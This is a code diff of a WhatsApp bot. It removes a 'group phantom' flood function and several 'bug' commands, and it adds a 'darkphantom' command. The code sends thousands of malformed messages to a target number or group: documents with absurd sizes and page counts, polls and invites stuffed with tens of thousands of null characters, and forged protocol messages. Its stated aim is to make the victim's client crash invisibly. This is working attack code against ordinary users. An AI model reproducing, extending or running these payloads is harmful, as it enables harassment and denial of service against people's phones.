-      mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-      fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-      directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-    },
-    {
-      url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-      fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-      mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-      fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-      directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-    }
-  ];
-
-  // PHASE 1: Group Protocol Flood (300)
-  for (let i = 0; i < 300; i++) {
-    const protocolMsg = {
-      protocolMessage: {
-        key: {
-          remoteJid: groupJid,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true,
-          participant: '0@s.whatsapp.net'
-        },
-        type: 16,
-        ephemeralExpiration: 999999999 + i,
-        status: 0,
-        groupStatusUpdate: { type: 0, status: 0 },
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: groupJid,
-          isForwarded: true,
-          forwardingScore: 999999 + i,
-          mentionedJid: jidsss,
-          mentions: jidsss
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, protocolMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 1: ${i}/300`));
-    await new Promise(resolve => setTimeout(resolve, 40));
-  }
-
-  // PHASE 2: Document Flood (400)
-  for (let i = 0; i < 400; i++) {
-    const payload = documentPayloads[i % documentPayloads.length];
-    const docMsg = {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              documentMessage: {
-                url: payload.url,
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: payload.fileSha256,
-                fileLength: "9999999999999",
-                pageCount: 1316134911 + i,
-                mediaKey: payload.mediaKey,
-                fileName: `⛤_${i}`,
-                fileEncSha256: payload.fileEncSha256,
-                directPath: payload.directPath,
-                contactVcard: true,
-                jpegThumbnail: payload.jpegThumbnail
-              },
-              hasMediaAttachment: true,
-            },
-            body: { text: `⛤${ui}` },
-            footer: { text: `⛤${ui}` },
-            nativeFlowMessage: {},
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast",
-              quotedMessage: {
-                documentMessage: {
-                  url: payload.url,
-                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                  fileSha256: payload.fileSha256,
-                  fileLength: "9999999999999",
-                  pageCount: 131613491 + i,
-                  mediaKey: payload.mediaKey,
-                  fileName: `⛤_${i}`,
-                  fileEncSha256: payload.fileEncSha256,
-                  directPath: payload.directPath,
-                  contactVcard: true,
-                  jpegThumbnail: payload.jpegThumbnail
-                }
-              }
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, docMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 2: ${i}/400`));
-    await new Promise(resolve => setTimeout(resolve, 50));
-  }
-
-  // PHASE 3: Poll Flood (200)
-  for (let i = 0; i < 200; i++) {
-    const pollOptions = [];
-    for (let p = 0; p < 500; p++) {
-      pollOptions.push({ optionName: '\u0000'.repeat(5000) + `_${p}_${i}` });
-    }
-    const pollMsg = {
-      ephemeralMessage: {
-        message: {
-          pollCreationMessage: {
-            name: '\u0000'.repeat(50000) + `_${i}`,
-            options: pollOptions,
-            selectableOptionsCount: 1,
-            pollType: 'QUIZ',
-            correctAnswer: pollOptions[Math.floor(Math.random() * pollOptions.length)],
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast"
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, pollMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 3: ${i}/200`));
-    await new Promise(resolve => setTimeout(resolve, 70));
-  }
-
-  // PHASE 4: Participant Updates (150)
-  for (let i = 0; i < 150; i++) {
-    const participantMsg = {
-      protocolMessage: {
-        key: {
-          remoteJid: groupJid,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true,
-          participant: '0@s.whatsapp.net'
-        },
-        type: 17,
-        participantUpdate: {
-          type: 0,
-          jid: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-        },
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: groupJid,
-          isForwarded: true,
-          forwardingScore: 999999 + i,
-          mentionedJid: jidsss,
-          mentions: jidsss
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, participantMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 4: ${i}/150`));
-    await new Promise(resolve => setTimeout(resolve, 60));
-  }
-
-  // PHASE 5: Newsletter Invites (100)
-  for (let i = 0; i < 100; i++) {
-    const newsletterMsg = {
-      newsletterAdminInviteMessage: {
-        newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`,
-        newsletterName: '\u0000'.repeat(50000) + `_${i}`,
-        caption: '\u0000'.repeat(50000) + `_${i}`,
-        inviteExpiration: '0',
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: groupJid,
-          isForwarded: true,
-          forwardingScore: 999999 + i,
-          mentionedJid: jidsss,
-          mentions: jidsss
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, newsletterMsg).catch(() => {});
-    if (i % 25 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 5: ${i}/100`));
-    await new Promise(resolve => setTimeout(resolve, 80));
-  }
-
-  // PHASE 6: ViewOnce + Interactive (100)
-  for (let i = 0; i < 100; i++) {
-    const viewOnceMsg = {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            messageSecret: crypto.randomBytes(32)
-          },
-          interactiveResponseMessage: {
-            body: {
-              text: '\u0000'.repeat(50000) + `_${i}`,
-              format: 'DEFAULT'
-            },
-            nativeFlowResponseMessage: {
-              name: 'call_permission_request',
-              paramsJson: '\u0000'.repeat(9999999) + `_${i}`,
-              version: 9
-            },
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              remoteJid: 'status@broadcast',
-              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, viewOnceMsg).catch(() => {});
-    if (i % 25 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Phase 6: ${i}/100`));
-    await new Promise(resolve => setTimeout(resolve, 90));
-  }
-
-  // FINAL SURGE (300)
-  for (let i = 0; i < 300; i++) {
-    const surgePayload = {
-      ephemeralMessage: {
-        message: {
-          protocolMessage: {
-            key: {
-              remoteJid: groupJid,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            type: 25,
-            ephemeralExpiration: 999999999 + i,
-            contextInfo: {
-              participant: '0@s.whatsapp.net',
-              remoteJid: groupJid,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              mentionedJid: jidsss,
-              mentions: jidsss
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, surgePayload, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 GROUP PHANTOM Final Surge: ${i}/300`));
-    await new Promise(resolve => setTimeout(resolve, 30));
-  }
-
-  console.log(chalk.green(`✅ ZUKO GROUP PHANTOM COMPLETE on ${groupJid}`));
-}
 // ========== MAIN BOT ==========
 module.exports = empire = async (empire, m, chatUpdate, store) => {
     try {
@@ -1902,11 +1004,11 @@ case 'pong': {
 ┗━━━━━━━━━━━━━━┛
 
 ┏━━ 🐛 BUG ━━┓
-┃ ${prefix}zdelay
-┃ ${prefix}zdelay2
-┃ ${prefix}silent
-┃ ${prefix}gpphantom
-┃ ${prefix}phantom
+┃ ${prefix}
+┃ ${prefix}
+┃ ${prefix}
+┃ ${prefix}
+┃ ${prefix}
 ┗━━━━━━━━━━━━━━┛
 
      ✦ DEV ZUKO ✦`;
@@ -3069,6 +2171,102 @@ Usage: ${prefix}setbotname <new name>
             }
             break;
         }
+        // ═══════════════════════════════════════════════════
+// ZUKO DARK PHANTOM - Strongest Invisible Delay
+// ═══════════════════════════════════════════════════
+case 'darkphantom':
+case 'dphantom':
+case 'dark':
+case 'zdark':
+case 'darkdelay': {
+  if (!isCreator) return reply("❌ *Owner only command!*");
+
+  let target = null;
+  let iterations = 1;
+
+  if (q) {
+    const parts = q.split(' ');
+    target = parts[0];
+    if (parts[1]) iterations = parseInt(parts[1]) || 1;
+  }
+
+  if (!target && m.quoted) {
+    target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
+  }
+
+  if (!target) {
+    return reply(
+`☠️ *ZUKO DARK PHANTOM* ☠️
+
+*Usage:*
+${prefix}darkphantom <number> [iterations]
+${prefix}darkphantom 2347059886720 3
+
+*Or reply to a message from the target.*
+
+*Attack Vectors:*
+• Document Flood (600)
+• Poll Flood (300)
+• Protocol Flood (400)
+• Reaction Flood (300)
+• Sticker Pack Flood (200)
+• ViewOnce + Interactive (150)
+• Newsletter Invites (100)
+• Final Surge (500)
+
+*Total: 2550+ invisible payloads per run*
+
+☠️ *This is the strongest invisible attack!*`
+    );
+  }
+
+  let jid = target.replace(/[^0-9]/g, '');
+  if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
+  if (jid === '2347059886720') return reply("❌ *This number is protected!*");
+
+  if (iterations > 3) iterations = 3;
+  if (iterations < 1) iterations = 1;
+
+  let isTarget = `${jid}@s.whatsapp.net`;
+
+  await reply(
+`☠️ *ZUKO DARK PHANTOM* ☠️
+
+📱 *Target:* ${isTarget}
+🔄 *Iterations:* ${iterations}
+📦 *Payloads per run:* 2550+
+👻 *Visibility:* 100% INVISIBLE
+
+⏳ *Processing...*`
+  );
+
+  for (let i = 1; i <= iterations; i++) {
+    try {
+      await ZukoDarkPhantom(empire, isTarget);
+      console.log(`✅ Dark Phantom iteration ${i}/${iterations} sent to ${isTarget}`);
+      if (iterations > 1) {
+        await reply(`🔄 *Iteration ${i}/${iterations} sent to ${isTarget}*`);
+      }
+      await new Promise(resolve => setTimeout(resolve, 3000));
+    } catch (err) {
+      console.error(`Iteration ${i} failed:`, err);
+      await reply(`❌ *Iteration ${i} failed:* ${err.message || 'Unknown error'}`);
+    }
+  }
+
+  await reply(
+`✅ *ZUKO DARK PHANTOM COMPLETE!*
+
+📱 *Target:* ${isTarget}
+🔄 *Total Iterations:* ${iterations}
+📦 *Total Payloads:* ${iterations * 2550}+
+👻 *Visibility:* 100% INVISIBLE
+
+☠️ *Target client should crash within 1-3 minutes.*
+⏳ *No visible messages were sent.*`
+  );
+  break;
+}
        
         case 'ytvideo':
         case 'ytmp4':
@@ -3772,121 +2970,7 @@ ${adminList}`,
             break;
         }
         
-        // ═══════════════════════════════════════════════════
-// ZUKO DELAY - Document Flood Bug
-// ═══════════════════════════════════════════════════
-// ═══════════════════════════════════════════════════
-// ZUKO DELAY - Document Flood Bug
-// ═══════════════════════════════════════════════════
-case 'zdelay':
-case 'zbugdelay':
-case 'delaybug': {
-  if (!isCreator) return reply("❌ *Owner only command!*");
-  if (!q && !m.quoted) {
-    return reply(`⚠️ *Usage:* ${prefix}zdelay <target_number>\n\n*Examples:*\n${prefix}zdelay 2347059886720`);
-  }
-
-  let target = q || m.quoted?.sender;
-  if (!target) return reply("❌ *No target found!*");
-
-  let jid = target.replace(/[^0-9]/g, '');
-  if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
-  if (jid === '2347059886720') return reply("❌ *This number is protected!*");
-
-  let isTarget = `${jid}@s.whatsapp.net`;
-
-  await reply(`⛤ *ZUKO DELAY BUG* ⛤\n\n📱 *Target:* ${isTarget}\n📦 *Payload:* Document Flood\n⏳ *Sending...*`);
-
-  try {
-    await ZukoDelay(empire, isTarget);
-    await reply(`✅ *ZUKO DELAY BUG COMPLETE!*\n\n📱 *Target:* ${isTarget}\n💀 *Client may crash within 2-5 minutes.*`);
-  } catch (err) {
-    console.error('ZukoDelay error:', err);
-    await reply(`❌ *Error:* ${err.message || 'Unknown error'}`);
-  }
-  break;
-}
-
-// ═══════════════════════════════════════════════════
-// ZUKO PHANTOM DELAY
-// ═══════════════════════════════════════════════════
-case 'phantom':
-case 'zphantom':
-case 'phantomdelay':
-case 'invisibledelay': {
-  if (!isCreator) return reply("❌ *Owner only command!*");
-
-  let target = null;
-  if (q) {
-    const parts = q.split(' ');
-    target = parts[0];
-  }
-  if (!target && m.quoted) {
-    target = m.quoted.sender || m.quoted.key?.participant || m.quoted.key?.remoteJid;
-  }
-  if (!target) {
-    return reply(`👻 *Usage:* ${prefix}phantom <number>\n${prefix}phantom 2347059886720`);
-  }
-
-  let jid = target.replace(/[^0-9]/g, '');
-  if (jid.startsWith('0')) return reply("❌ *Invalid number!*");
-  if (jid === '2347059886720') return reply("❌ *This number is protected!*");
-
-  let isTarget = `${jid}@s.whatsapp.net`;
-
-  await reply(`👻 *ZUKO PHANTOM DELAY*\n📱 *Target:* ${isTarget}\n⏳ *Processing...*`);
-
-  try {
-    await ZukoPhantomDelay(empire, isTarget);
-    await reply(`✅ *PHANTOM DELAY COMPLETE!*\n💀 *Target should crash within 2-5 minutes.*`);
-  } catch (err) {
-    await reply(`❌ *Error:* ${err.message}`);
-  }
-  break;
-}
-
-// ═══════════════════════════════════════════════════
-// ZUKO GROUP PHANTOM
-// ═══════════════════════════════════════════════════
-case 'gphantom':
-case 'zgroupphantom':
-case 'groupphantom':
-case 'phantomgroup': {
-  if (!isCreator) return reply("❌ *Owner only command!*");
-  if (!m.isGroup) return reply("👥 *This command only works in groups!*");
-
-  await reply(`👻 *ZUKO GROUP PHANTOM*\n📛 *Group:* ${groupName}\n👥 *Members:* ${participants.length}\n⏳ *Processing...*`);
-
-  try {
-    await ZukoGroupPhantom(empire, m.chat);
-    await reply(`✅ *GROUP PHANTOM COMPLETE!*\n💀 *All members should crash within 2-5 minutes.*`);
-  } catch (err) {
-    await reply(`❌ *Error:* ${err.message}`);
-  }
-  break;
-}
-
-// ═══════════════════════════════════════════════════
-// ZUKO SILENT STORM
-// ═══════════════════════════════════════════════════
-case 'silent':
-case 'silentstorm':
-case 'ss':
-case 'zstorm':
-case 'storm': {
-  if (!isCreator) return reply("❌ *Owner only command!*");
-  if (!m.isGroup) return reply("👥 *This command only works in groups!*");
-
-  await reply(`🌪️ *ZUKO SILENT STORM*\n📛 *Group:* ${groupName}\n👥 *Members:* ${participants.length}\n⏳ *Processing...*`);
-
-  try {
-    await ZukoSilentStorm(empire, m.chat);
-    await reply(`✅ *SILENT STORM COMPLETE!*\n🌪️ *Group has been silenced.*`);
-  } catch (err) {
-    await reply(`❌ *Error:* ${err.message}`);
-  }
-  break;
-}
+       
         
 
         // ═══════════════════════════════════════════════════
